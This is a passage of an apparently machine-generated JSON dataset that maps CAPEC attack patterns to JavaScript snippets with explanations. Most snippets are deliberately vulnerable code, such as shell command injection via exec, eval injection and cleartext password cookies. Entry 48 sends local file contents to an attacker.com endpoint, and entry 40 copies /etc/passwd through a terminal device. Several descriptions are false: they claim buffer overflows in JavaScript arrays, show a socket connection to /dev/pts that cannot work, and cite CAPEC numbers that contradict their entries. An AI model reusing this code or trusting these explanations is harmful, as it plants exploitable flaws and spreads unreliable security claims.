        "code_snippet": "const lockA = { locked: false };\nconst lockB = { locked: false };\n\nfunction acquireLock(lock) {\n  return new Promise((resolve) => {\n    (function waitForLock() {\n      if (!lock.locked) {\n        lock.locked = true;\n        resolve();\n      } else {\n        setTimeout(waitForLock, 10);\n      }\n    })();\n  });\n}\n\nasync function task1() {\n  await acquireLock(lockA);\n  console.log('Task 1 acquired lockA');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockB);\n  console.log('Task 1 acquired lockB');\n  lockB.locked = false;\n  lockA.locked = false;\n}\n\nasync function task2() {\n  await acquireLock(lockB);\n  console.log('Task 2 acquired lockB');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockA);\n  console.log('Task 2 acquired lockA');\n  lockA.locked = false;\n  lockB.locked = false;\n}\n\ntask1();\ntask2();",
        "description": "This JavaScript code snippet demonstrates a forced deadlock scenario. Two tasks, `task1` and `task2`, attempt to acquire two locks, `lockA` and `lockB`, in opposite order. `task1` acquires `lockA` first and then tries to acquire `lockB`, while `task2` acquires `lockB` first and then tries to acquire `lockA`. This creates a deadlock condition where both tasks are waiting indefinitely for each other to release the locks they need. The code uses asynchronous functions and promises to simulate the locking mechanism and the delay in acquiring locks. This example embodies the main idea of the CAPEC by illustrating how improper synchronization and locking can lead to a deadlock, causing a denial of service."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst path = '/tmp/sensitive_file';\n\n// Check if the file exists\nif (fs.existsSync(path)) {\n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Read the file content\n    fs.readFile(path, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000);\n} else {\n  console.log('File does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability. The code first checks if a file exists at a specified path. If the file exists, it introduces a delay using setTimeout before reading the file's content. During this delay, an attacker could potentially replace the file with a malicious version, leading to the system reading and executing the malicious file instead of the original one. This embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and relates to CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst tempFilePath = '/tmp/tempfile';\nconst sensitiveFilePath = '/etc/sensitivefile';\n\n// Check if the temporary file exists\nif (!fs.existsSync(tempFilePath)) {\n  // Simulate a race condition by creating a symlink to the sensitive file\n  fs.symlinkSync(sensitiveFilePath, tempFilePath);\n\n  // Create and write to the temporary file\n  fs.writeFileSync(tempFilePath, 'malicious content');\n\n  console.log('Temporary file created and written to.');\n} else {\n  console.log('Temporary file already exists.');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability involving symbolic links. The code first checks if a temporary file exists. If it does not, it creates a symbolic link pointing to a sensitive file. Then, it writes malicious content to the temporary file, which actually writes to the sensitive file due to the symbolic link. This embodies the main idea of the CAPEC by exploiting the time-of-check time-of-use (TOCTOU) race condition and improper handling of symbolic links, leading to unauthorized file access and modification."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let inputData = '';\n  req.on('data', chunk => {\n    inputData += chunk;\n  });\n  req.on('end', () => {\n    try {\n      // Vulnerable to improper input validation (CWE-20)\n      if (inputData.includes('<script>')) {\n        throw new Error('Malicious input detected');\n      }\n      // Vulnerable to improper neutralization of special elements (CWE-74)\n      let command = `echo ${inputData}`;\n      require('child_process').exec(command, (err, stdout, stderr) => {\n        if (err) {\n          // Vulnerable to generation of error message containing sensitive information (CWE-209)\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end(`Error: ${err.message}`);\n        } else {\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end(stdout);\n        }\n      });\n    } catch (e) {\n      res.writeHead(400, {'Content-Type': 'text/plain'});\n      res.end('Invalid input');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads input data from a request. The code is vulnerable to several weaknesses: improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and generation of error messages containing sensitive information (CWE-209). The server reads input data and checks for the presence of a '<script>' tag, which is a naive and incomplete validation (CWE-184). It then constructs a shell command using the input data without proper sanitization, making it susceptible to command injection attacks. If an error occurs during command execution, the server responds with an error message that may contain sensitive information. This code demonstrates how fuzzing can be used to identify and exploit these vulnerabilities by feeding random or malicious input to the server."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst filePath = '/tmp/sensitive_file';\n\n// Time-of-check\nif (fs.existsSync(filePath)) {\n  console.log('File exists, proceeding to read...');\n  \n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Time-of-use\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000); // Delay to allow potential malicious modification\n} else {\n  console.log('File does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability. The code first checks if a file exists at a specified path ('/tmp/sensitive_file'). If the file exists, it waits for one second before reading the file's content. This delay creates a window of opportunity for an attacker to modify or replace the file between the check (fs.existsSync) and the use (fs.readFile). This embodies the main idea of CAPEC-367, where the state of a resource can change between the check and the use, leading to unexpected behavior. The delay simulates the race condition window, making the code vulnerable to exploitation."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-114: Load a library from an untrusted source\nconst maliciousLibrary = './maliciousLibrary.so';\n\n// CWE-270: Privilege Context Switching Error\nfunction elevatePrivileges() {\n  // Simulate privilege escalation\n  process.setuid(0); // Set user ID to root (privileged)\n}\n\n// CWE-362: Race Condition\nlet sharedResource = 'safe';\nfunction manipulateSharedResource() {\n  if (sharedResource === 'safe') {\n    sharedResource = 'unsafe';\n  }\n}\n\n// CWE-78: OS Command Injection\nfunction executeCommand(command) {\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Simulate hijacking a privileged thread\nfunction hijackThread() {\n  elevatePrivileges();\n  manipulateSharedResource();\n  executeCommand(`ls ${maliciousLibrary}`); // Potential OS Command Injection\n}\n\n// Simulate the attack\nhijackThread();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Hijacking a Privileged Thread of Execution' by combining several related CWEs. The code simulates a scenario where an attacker hijacks a privileged thread to execute malicious actions. It includes: \n1. CWE-114: Loading a potentially malicious library from an untrusted source.\n2. CWE-270: Simulating privilege escalation by changing the process's user ID to root.\n3. CWE-362: Introducing a race condition by manipulating a shared resource.\n4. CWE-78: Executing an OS command that could be influenced by external input, leading to command injection.\nThe `hijackThread` function encapsulates these actions, representing the main idea of the CAPEC by showing how an attacker can manipulate a privileged thread to perform malicious activities."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  // Assume user authentication is successful\n  res.cookie('session', `${username}:${password}`, { httpOnly: true });\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionCookie = req.cookies.session;\n  if (sessionCookie) {\n    const [username, password] = sessionCookie.split(':');\n    // Assume session validation is successful\n    res.send(`Welcome ${username}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that uses cookies to manage user sessions. The '/login' endpoint sets a session cookie containing the username and password in cleartext, which is a security risk (CWE-315). The '/dashboard' endpoint retrieves and parses this cookie to authenticate the user, without validating the integrity of the cookie (CWE-565) or encrypting the sensitive data (CWE-311). This setup is vulnerable to attacks such as cookie interception and modification (CAPEC-Accessing/Intercepting/Modifying HTTP Cookies). The code demonstrates improper handling of cookies, including reliance on client-side data for security-critical operations (CWE-602) and potential session fixation issues (CWE-384)."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: directly using user input in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>User Input: ${userInput}</h1></body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server parses the query string from the URL to extract user input and then directly embeds this input into an HTML response without any sanitization or escaping. This represents the main idea of the CAPEC 'XSS Through HTTP Query Strings' by demonstrating how an attacker can inject malicious script code through the query string, which is then executed by the victim's browser. The related CWEs are exemplified by the lack of proper neutralization (CWE-80, CWE-79), the use of GET request method (CWE-598), and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Request Smuggling\n    if (body.includes('Content-Length:') && body.includes('Transfer-Encoding: chunked')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Request Smuggling Detected');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Hello World');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that is vulnerable to HTTP Request Smuggling. The server reads the incoming request body and checks for the presence of both 'Content-Length' and 'Transfer-Encoding: chunked' headers. If both headers are present, it indicates a potential HTTP Request Smuggling attack. The code does not properly handle or neutralize these headers, leading to inconsistent interpretation by different HTTP agents. This vulnerability can be exploited to send unauthorized and malicious HTTP requests to a back-end server. The code demonstrates the main idea of CAPEC-33 (HTTP Request Smuggling) and incorporates related CWEs such as CWE-444 (Inconsistent Interpretation of HTTP Requests) and CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query string\n  if (userInput) {\n    // Vulnerable to HTTP Response Splitting\n    res.setHeader('Content-Type', 'text/html');\n    res.setHeader('Set-Cookie', 'sessionId=abc123; Path=/; HttpOnly');\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`Hello, ${userInput}`);\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('Hello, World!');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server takes user input from the URL query string and includes it in the HTTP response without proper sanitization. This makes the server vulnerable to HTTP Response Splitting (CWE-113). An attacker could inject CRLF sequences into the user input to manipulate the HTTP headers and create additional unauthorized responses. This example demonstrates the improper neutralization of special elements (CWE-74, CWE-138) and the potential for inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst configPath = 'config.json';\n\n// Read configuration file\nlet configData = fs.readFileSync(configPath, 'utf8');\n\n// Vulnerable: Directly evaluating the content of the configuration file\ntry {\n  let config = JSON.parse(configData);\n  if (config.execute) {\n    eval(config.execute); // CWE-95: Eval Injection\n  }\n} catch (err) {\n  console.error('Error parsing config file:', err);\n}\n\n// Vulnerable: Improper control of code generation\nlet userInput = 'someUserInput';\nlet dynamicCode = `console.log('${userInput}');`;\neval(dynamicCode); // CWE-94: Code Injection",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can leverage executable code in non-executable files, specifically a configuration file. The code reads a configuration file ('config.json') and directly evaluates its content using 'eval', which is a common vulnerability (CWE-95: Eval Injection). Additionally, it shows improper control of code generation by constructing a code segment using user input without proper neutralization (CWE-94: Code Injection). This snippet embodies the main idea of CAPEC-184 by illustrating how an attacker can exploit a system's trust in configuration files to execute malicious code."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "function unpublishedFunction() {\n    // Undocumented and unpublished functionality\n    console.log('This is an unpublished function');\n}\n\nfunction main() {\n    // No authentication or authorization checks\n    if (user.isAdmin) {\n        unpublishedFunction();\n    } else {\n        console.log('Access denied');\n    }\n}\n\n// Simulate an attacker invoking the unpublished function directly\nunpublishedFunction();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Using Unpublished Interfaces or Functionality' (CAPEC). The 'unpublishedFunction' is an undocumented and unpublished function that should not be publicly accessible. The 'main' function attempts to control access to 'unpublishedFunction' based on an 'isAdmin' check, but there are no actual authentication or authorization mechanisms in place (CWE-306, CWE-862). Additionally, the 'unpublishedFunction' can be directly invoked by an attacker, bypassing any intended access controls (CWE-693, CWE-1242). This code highlights the risks of including undocumented features and failing to implement proper security checks."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage without encryption\nlocalStorage.setItem('password', sensitiveData);\n\n// Retrieve sensitive data from local storage\nconst retrievedData = localStorage.getItem('password');\nconsole.log('Retrieved Data:', retrievedData);",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC 'Retrieve Embedded Sensitive Data'. The code stores sensitive information (a user password) in the browser's local storage without encryption (CWE-311, CWE-312). This makes the sensitive data easily accessible to an attacker who can retrieve it from the local storage (CWE-525). The code highlights the risk of storing sensitive information in cleartext within a resource that might be accessible to another control sphere, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable function that loads a configuration file\nfunction loadConfig(configFileName) {\n  const configPath = path.join(__dirname, configFileName);\n  if (fs.existsSync(configPath)) {\n    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));\n    return config;\n  } else {\n    throw new Error('Configuration file not found');\n  }\n}\n\n// Example usage\nconst userProvidedFileName = process.argv[2]; // External control of file name\nconst config = loadConfig(userProvidedFileName);\nconsole.log('Loaded configuration:', config);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that loads a configuration file based on a user-provided file name. The function `loadConfig` constructs the path to the configuration file using the `path.join` method and reads the file if it exists. The user-provided file name is taken from the command line arguments (`process.argv[2]`), which represents an external control of the file name (CWE-73). This can lead to an untrusted search path (CWE-426) and uncontrolled search path element (CWE-427) vulnerabilities, as an attacker can supply a malicious file name to load a malicious configuration file. The code snippet embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate the search path to load malicious resources."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const user = req.query.user;\n  // Assume user authentication is done here\n  res.cookie('auth', Buffer.from(user).toString('base64'), { httpOnly: true });\n  res.send('Logged in');\n});\n\napp.get('/profile', (req, res) => {\n  const authCookie = req.cookies['auth'];\n  if (!authCookie) {\n    return res.status(401).send('Unauthorized');\n  }\n  const user = Buffer.from(authCookie, 'base64').toString('ascii');\n  // No integrity check on the cookie value\n  res.send(`Welcome ${user}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet demonstrates a simple Express.js application that uses cookies to manage user authentication. The '/login' endpoint sets an 'auth' cookie with the base64-encoded username after a user logs in. The '/profile' endpoint retrieves the 'auth' cookie and decodes it to get the username. However, this implementation is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Missing Support for Integrity Check (CWE-353)**: The 'auth' cookie is not validated for integrity, allowing an attacker to tamper with it.\n2. **Improper Authorization (CWE-285)**: The application does not perform proper authorization checks beyond the presence of the 'auth' cookie.\n3. **Authentication Bypass by Assumed-Immutable Data (CWE-302)**: The application assumes the 'auth' cookie is immutable, but it can be modified by an attacker.\n4. **Reliance on Cookies without Validation and Integrity Checking (CWE-565)**: The application relies on the 'auth' cookie without validating its integrity.\n5. **Cleartext Storage of Sensitive Information in a Cookie (CWE-315)**: The 'auth' cookie stores sensitive information (username) in base64, which is easily decoded.\n\nThis code snippet embodies the main idea of the CAPEC by showing how client-side tokens (cookies) can be manipulated if not properly protected, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const fs = require('fs');\nconst net = require('net');\n\nconst terminalDevice = '/dev/pts/1'; // Target terminal device\nconst maliciousCommand = 'cat /etc/passwd > /tmp/stolen_passwd\\n';\n\nconst client = new net.Socket();\nclient.connect({ path: terminalDevice }, () => {\n  client.write(maliciousCommand);\n  client.end();\n});\n\n// Simulate attacker collecting the stolen file\nsetTimeout(() => {\n  fs.readFile('/tmp/stolen_passwd', 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log('Stolen data:', data);\n  });\n}, 5000);",
        "description": "This JavaScript code snippet demonstrates an attack that exploits a writable terminal device. The attacker connects to a target terminal device and sends a malicious command to copy the contents of '/etc/passwd' to a temporary file '/tmp/stolen_passwd'. After a delay, the attacker reads the stolen file to collect the sensitive data. This code embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78), exposure of sensitive information (CWE-214), and process control (CWE-114)."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "const sendEmail = (to, subject, body) => {\n  const emailHeaders = `To: ${to}\\nSubject: ${subject}\\n`;\n  const emailBody = `${body}`;\n  const email = emailHeaders + '\\n' + emailBody;\n  // Simulate sending email\n  console.log('Sending email:', email);\n};\n\n// Example usage\nconst maliciousPayload = 'Hello\\nBcc: victim@example.com\\n\\n<script>alert(\"XSS\")<\\/script>';\nsendEmail('user@example.com', 'Test Subject', maliciousPayload);",
        "description": "This JavaScript code snippet demonstrates a vulnerable email sending function that constructs email headers and body without proper neutralization of meta-characters. The `sendEmail` function takes `to`, `subject`, and `body` as parameters and constructs the email content by concatenating these values. The example usage shows how an attacker can inject a malicious payload into the email body, including additional headers and a script tag. This represents the CAPEC idea of using meta-characters in email headers to inject malicious payloads. The related CWEs are exemplified by the lack of proper neutralization (CWE-150), improper encoding (CWE-116), and potential for argument injection (CWE-88)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(input) {\n  let buffer = new Array(256);\n  for (let i = 0; i < input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\nlet userInput = 'A'.repeat(300); // Simulating a long input\nlet mimeData = convertToMIME(userInput);\nconsole.log(mimeData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable MIME conversion routine. The function `convertToMIME` takes an input string and converts it to a MIME-compatible format by copying each character's char code into a fixed-size buffer of 256 elements. The code does not check if the input length exceeds the buffer size, leading to a classic buffer overflow vulnerability (CWE-120). This can cause the program to write outside the bounds of the buffer (CWE-119), potentially allowing an attacker to execute arbitrary code. The `userInput` variable simulates an attacker providing a long input string, which exceeds the buffer size and triggers the overflow."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "function processInput(input) {\n  // First parser layer: decode HTML entities\n  let parser1 = input.replace(/&lt;/g, '<').replace(/&gt;/g, '>');\n  \n  // Input validation layer: check for script tags\n  if (parser1.includes('<script>')) {\n    throw new Error('Invalid input: script tags are not allowed');\n  }\n  \n  // Second parser layer: further decode URL encoding\n  let parser2 = decodeURIComponent(parser1);\n  \n  // Process the input (e.g., execute a command)\n  console.log('Processing input:', parser2);\n}\n\n// Example of malicious input that bypasses validation\nlet maliciousInput = '%3Cscript%3Ealert(1)%3C%2Fscript%3E';\ntry {\n  processInput(maliciousInput);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The function `processInput` takes an input string and processes it through multiple layers. The first layer decodes HTML entities, the second layer performs input validation to check for script tags, and the third layer decodes URL encoding. The input validation is bypassed because the validation occurs before the second decoding step, allowing a malicious input like '%3Cscript%3Ealert(1)%3C%2Fscript%3E' to pass through the validation and be executed. This example highlights the CWE-179 (Incorrect Behavior Order: Early Validation) and CWE-78 (Improper Neutralization of Special Elements used in an OS Command) weaknesses."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function loadImage(file) {\n  const reader = new FileReader();\n  reader.onload = function(event) {\n    const buffer = new ArrayBuffer(1024); // Fixed buffer size\n    const view = new Uint8Array(buffer);\n    const data = new Uint8Array(event.target.result);\n    for (let i = 0; i < data.length; i++) {\n      view[i] = data[i]; // No bounds checking\n    }\n    // Process the image data\n    processImage(view);\n  };\n  reader.readAsArrayBuffer(file);\n}\n\nfunction processImage(data) {\n  // Dummy function to represent image processing\n  console.log('Processing image data:', data);\n}\n\n// Usage example\nconst fileInput = document.getElementById('fileInput');\nfileInput.addEventListener('change', function(event) {\n  const file = event.target.files[0];\n  if (file && file.type === 'image/jpeg') { // Relies on file extension\n    loadImage(file);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability when handling binary resources, specifically image files. The `loadImage` function reads an image file using the FileReader API and attempts to copy its contents into a fixed-size buffer without checking if the buffer is large enough to hold the data, leading to a buffer overflow (CWE-120, CWE-119). Additionally, the code relies on the file extension to determine if the file is a JPEG image (CWE-646), which can be exploited by an attacker to upload a malicious file disguised as a JPEG. The `processImage` function is a placeholder for further image processing, which could be exploited to execute arbitrary code."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readSymbolicLink(filePath) {\n  try {\n    const resolvedPath = fs.readlinkSync(filePath);\n    const buffer = Buffer.alloc(256);\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n    if (data.length > buffer.length) {\n      throw new Error('Buffer overflow detected');\n    }\n    buffer.write(data);\n    console.log('Data:', buffer.toString());\n  } catch (err) {\n    console.error('Error:', err.message);\n  }\n}\n\nconst symlinkPath = path.join(__dirname, 'symlink');\nreadSymbolicLink(symlinkPath);",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The function `readSymbolicLink` takes a file path, resolves the symbolic link, and reads the content of the target file. It allocates a fixed-size buffer of 256 bytes and attempts to write the file content into this buffer. If the file content exceeds the buffer size, it throws an error indicating a buffer overflow. This example embodies the CAPEC concept by showing how symbolic links can be manipulated to cause buffer overflows. The code also touches on related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "function processConfig(config) {\n    var buffer = new Array(256);\n    for (var i = 0; i < config.tags.length; i++) {\n        buffer[i] = config.tags[i]; // CWE-120: No size check\n    }\n    return buffer.join('');\n}\n\nvar maliciousConfig = {\n    tags: new Array(300).fill('A') // Oversized input to cause overflow\n};\n\nconsole.log(processConfig(maliciousConfig));",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a configuration object with tags is processed without proper size checks, leading to a buffer overflow. The function `processConfig` takes a configuration object and copies its tags into a fixed-size buffer of 256 elements. However, it does not check if the number of tags exceeds the buffer size, which can lead to a buffer overflow (CWE-120). The `maliciousConfig` object is crafted with 300 tags, which exceeds the buffer size and causes an overflow when processed. This snippet embodies the main idea of the CAPEC by showing how oversized strings in a configuration file can lead to a buffer overflow."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new Array(10).fill(0);\n  let expandedInput = input.repeat(2); // Expands the input size\n  for (let i = 0; i < expandedInput.length; i++) {\n    buffer[i] = expandedInput.charCodeAt(i); // Potential buffer overflow\n  }\n  return buffer;\n}\n\n// Example usage\nlet userInput = '1234567890';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerableFunction` takes an input string, expands it by repeating it twice, and then attempts to copy the expanded input into a fixed-size buffer of 10 elements. If the expanded input exceeds the buffer size, it will cause a buffer overflow. This example embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-131 (Incorrect Calculation of Buffer Size)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchResource(resource) {\n  if (resource.startsWith('http://') || resource.startsWith('https://')) {\n    fetch(resource)\n      .then(response => response.text())\n      .then(data => console.log(data))\n      .catch(error => console.error('Error fetching URL:', error));\n  } else if (resource.startsWith('file://')) {\n    fetch(resource)\n      .then(response => response.text())\n      .then(data => {\n        // Send local file data to attacker's server\n        fetch('http://attacker.com/steal', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ fileData: data })\n        });\n      })\n      .catch(error => console.error('Error fetching local file:', error));\n  } else {\n    console.error('Invalid resource type');\n  }\n}\n\n// Example usage\nfetchResource('file:///C:/Users/username/Documents/sensitive.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a function `fetchResource` is designed to fetch resources based on a given URL or local file path. The function does not properly handle the case where a local file path is provided (e.g., 'file://'). If an attacker can control the input to this function, they can specify a local file path, causing the browser to read the local file and send its contents to an attacker's server. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and is related to several CWEs, such as improper handling of unexpected data types (CWE-241), use of incorrectly-resolved names or references (CWE-706), and reliance on file names or extensions (CWE-646)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Authentication successful';\n  } else {\n    return 'Authentication failed';\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfor (let i = 0; i < 1000; i++) {\n  console.log(authenticate('user1', 'password123'));\n}\n\n// CWE-654: Reliance on a single factor in a security decision\n// CWE-308: Use of single-factor authentication\n// CWE-309: Use of password system for primary authentication",
        "description": "This JavaScript code snippet demonstrates a simple authentication system that is vulnerable to brute force attacks. The 'users' object stores usernames and passwords in plaintext, which is a weak password requirement (CWE-521). The 'authenticate' function checks if the provided username and password match the stored values. There are no restrictions on the number of authentication attempts (CWE-307), allowing an attacker to try multiple passwords in a short time frame. The system relies on single-factor authentication (CWE-654, CWE-308) and uses passwords as the primary means of authentication (CWE-309), making it susceptible to brute force attacks as described in the CAPEC."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "const users = { 'user1': { 'password': 'password123', 'securityQuestion': 'petName', 'securityAnswer': 'fluffy' } }; \n\nfunction recoverPassword(username, answer) { \n  if (users[username] && users[username].securityAnswer === answer) { \n    return users[username].password; \n  } else { \n    return 'Incorrect answer'; \n  } \n} \n\nconsole.log(recoverPassword('user1', 'fluffy')); // Outputs: password123",
        "description": "This JavaScript code snippet demonstrates a weak password recovery mechanism. It stores user passwords in plaintext and uses a simple security question for password recovery. If an attacker knows or guesses the answer to the security question, they can retrieve the user's password. This code embodies the main idea of CAPEC-139 (Password Recovery Exploitation) and highlights related CWEs such as CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials). The code is vulnerable because it uses easily guessable security questions and stores passwords in plaintext, making it easy for attackers to exploit."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
